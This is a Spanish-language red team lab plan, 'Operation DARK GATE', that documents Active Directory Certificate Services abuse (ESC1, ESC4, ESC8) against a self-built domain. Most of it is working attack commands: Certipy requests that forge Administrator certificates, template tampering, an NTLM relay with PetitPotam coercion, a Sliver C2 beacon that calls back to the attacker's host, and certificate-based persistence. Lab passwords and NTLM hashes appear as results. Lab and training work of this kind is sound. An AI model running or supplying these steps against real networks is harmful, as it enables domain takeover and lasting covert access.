# 🎯 OPERATION DARK GATE
### Plan de Operación — Lab-03: ADCS Abuse

---

## 📋 Ficha de Operación

| Campo | Detalle |
|-------|---------|
| **Nombre en clave** | DARK GATE |
| **Fecha de inicio** | 16/05/2026 |
| **Fecha de fin** | 17/05/2026 |
| **Operador** | Adrián Camacho |
| **Adversario simulado** | APT29 (Cozy Bear) |
| **Framework** | MITRE ATT&CK v14 — Enterprise |
| **C2** | Sliver v1.7.3 |
| **Objetivo primario** | Domain Admin via ADCS Abuse (ESC1/ESC4/ESC8) |
| **Objetivo secundario** | Persistencia via certificado de Administrador |
| **Entorno** | Lab propio — DC-01 reutilizado (atackcorp.local) |
| **Herramienta principal** | Certipy v5.0.4 |
| **Estado** | ✅ Completado |

---

## 🕵️ Perfil del Adversario — APT29 (Cozy Bear)

APT29 es un grupo de amenaza persistente avanzada atribuido al SVR ruso. Sus campañas más recientes (2021-2024) incluyen el abuso sistemático de Active Directory Certificate Services como vector de escalada de privilegios y persistencia a largo plazo. Los certificados tienen validez de meses o años — acceso persistente incluso tras rotación de contraseñas.

**TTPs de referencia:** [G0016 — APT29](https://attack.mitre.org/groups/G0016/)

---

## 🏗️ Entorno de Operación

```
┌─────────────────────────────────────────────────────┐
│              RED NAT — LabRedTeam                   │
│               Segmento: 10.0.2.0/24                 │
│                                                     │
│   ┌─────────────────────────────────────────────┐   │
│   │         DC-01 (Windows Server 2022)         │   │
│   │         10.0.2.10 — atackcorp.local         │   │
│   │         ADCS: AtackCorp-CA                  │   │
│   │         IIS: http://10.0.2.10/certsrv/     │   │
│   └─────────────────────────────────────────────┘   │
│                        ▲                            │
│   ┌────────────────────┴────────────────────────┐   │
│   │   Kali 10.0.2.9 — Certipy | Sliver C2      │   │
│   └─────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────┘
```

---

## 🔐 Vulnerabilidades ADCS Configuradas

| ESC | Tipo | Condición | Usuario |
|-----|------|-----------|---------|
| **ESC1** | Enrollee Supplies Subject | `msPKI-Certificate-Name-Flag = 1` en `VulnerableUser` | Domain Users |
| **ESC4** | Write Permissions on Template | `fin.garcia` tiene `GenericWrite + WriteDacl` | fin.garcia |
| **ESC8** | NTLM Relay to HTTP | Web Enrollment HTTP en `/certsrv/` | Cualquier equipo |

---

## 🗺️ Fases Completadas

### FASE 1 — Reconnaissance ✅
```bash
certipy-ad find -u ceo.martinez@atackcorp.local -p 'Direccion2024!' \
  -dc-ip 10.0.2.10 -stdout
```
- ESC1 confirmado en `VulnerableUser` ✅
- ESC8 confirmado — Web Enrollment HTTP ✅

---

### FASE 2 — ESC1 Exploitation ✅
```bash
certipy-ad req -u ceo.martinez@atackcorp.local -p 'Direccion2024!' \
  -ca AtackCorp-CA -template VulnerableUser \
  -upn Administrador@atackcorp.local -dc-ip 10.0.2.10

certipy-ad auth -pfx administrador.pfx -dc-ip 10.0.2.10 -domain atackcorp.local
```
**Hash:** `b73fdfe10e87b4ca5c0d957f81de6863` → shell DA ✅

> **Nota:** UPN debe ser `Administrador` (mayúscula) — dominio en español.

---

### FASE 3 — ESC4 Exploitation ✅
```bash
# Guardar backup → modificar → explotar → restaurar (OPSEC)
certipy-ad template -u fin.garcia@atackcorp.local -p 'Finance2024!' \
  -dc-ip 10.0.2.10 -template VulnerableUser -save-configuration VulnerableUser_backup.json

certipy-ad template -u fin.garcia@atackcorp.local -p 'Finance2024!' \
  -dc-ip 10.0.2.10 -template VulnerableUser -write-default-configuration -force

certipy-ad req -u fin.garcia@atackcorp.local -p 'Finance2024!' \
  -ca AtackCorp-CA -template VulnerableUser \
  -upn Administrador@atackcorp.local -dc-ip 10.0.2.10 -out administrador_esc4

certipy-ad template -u fin.garcia@atackcorp.local -p 'Finance2024!' \
  -dc-ip 10.0.2.10 -template VulnerableUser \
  -write-configuration VulnerableUser_backup.json -force
```
**Cert:** `administrador_esc4.pfx` + plantilla restaurada ✅

> **Nota Certipy v5:** Requiere `WriteDacl + WriteProperty` además de `GenericWrite`.

---

### FASE 4 — ESC8 NTLM Relay ✅ Identificado / ⚠️ Bloqueado KB5005413
```bash
sudo impacket-ntlmrelayx -t http://10.0.2.10/certsrv/certfnsh.asp \
  --adcs --template DomainController -smb2support

python3 /opt/redteam/PetitPotam.py -u ceo.martinez -p 'Direccion2024!' \
  -d atackcorp.local -pipe all 10.0.2.9 10.0.2.10
```
**PetitPotam:** `Attack worked!` ✅  
**Relay:** bloqueado por KB5005413 (WS2022) — documentado como comportamiento real ✅

---

### FASE 5 — C2 Establishment ✅
```
generate beacon --http 10.0.2.9:443 --os windows --arch amd64 \
  --format exe --seconds 60 --jitter 15 --save /tmp/beacon_dc01.exe
```
**Beacon:** `CLINICAL_CHAIRMAN` (4d1146b0) — DC-01 / ATACKCORP\Administrador ✅  
**Tres beacons activos:** EASY_PROFIT (Lab-01) + SUDDEN_COMMUNICATION (Lab-02) + CLINICAL_CHAIRMAN (Lab-03) ✅

---

### FASE 6 — Certificate Persistence ✅
```bash
net user Administrador "NuevaPassword2026!"  # rotación de contraseña
certipy-ad auth -pfx administrador.pfx -dc-ip 10.0.2.10 -domain atackcorp.local
# → hash bc3abc2e0673a58e9e559d415b56d69d — certificado sigue válido ✅
```

---

## 📸 Capturas

| Fase | Archivo | Estado |
|------|---------|--------|
| 1 | `fase1-01-certipy-find-esc8.png` | ✅ |
| 1 | `fase1-02-certipy-find-esc1.png` | ✅ |
| 2 | `fase2-01-esc1-cert-request.png` | ✅ |
| 2 | `fase2-02-esc1-auth-tgt.png` | ✅ |
| 2 | `fase2-03-da-shell.png` | ✅ |
| 3 | `fase3-01-esc4-template-modify.png` | ✅ |
| 3 | `fase3-02-esc4-cert-obtained.png` | ✅ |
| 3 | `fase3-03-esc4-template-restored.png` | ✅ |
| 4 | `fase4-01-esc8-iis-hardening-bypass.png` | ✅ |
| 4 | `fase4-02-esc8-ntlm-level-config.png` | ✅ |
| 4 | `fase4-03-esc8-ws2022-mitigated.png` | ✅ |
| 5 | `fase5-01-beacon-upload-exec.png` | ✅ |
| 5 | `fase5-02-sliver-beacon-dc01.png` | ✅ |
| 5 | `fase5-03-sliver-all-beacons.png` | ✅ |
| 5 | `fase5-04-sliver-session-active.png` | ✅ |
| 6 | `fase6-01-cert-persistence.png` | ✅ |
| 6 | `fase6-02-password-rotation.png` | ✅ |
| 6 | `fase6-03-cert-persistence-post-rotation.png` | ✅ |
| 6 | `fase6-04-objective-proof.png` | ✅ |

---

## 💡 Lecciones clave

- UPN en español: `Administrador` no `administrator`
- Certipy v5 requiere `WriteDacl` además de `GenericWrite` para ESC4
- ESC8 relay bloqueado en WS2022 por KB5005413
- Certificados persisten tras rotación de contraseñas

---

*Operación DARK GATE — Adrián Camacho | Mayo 2026*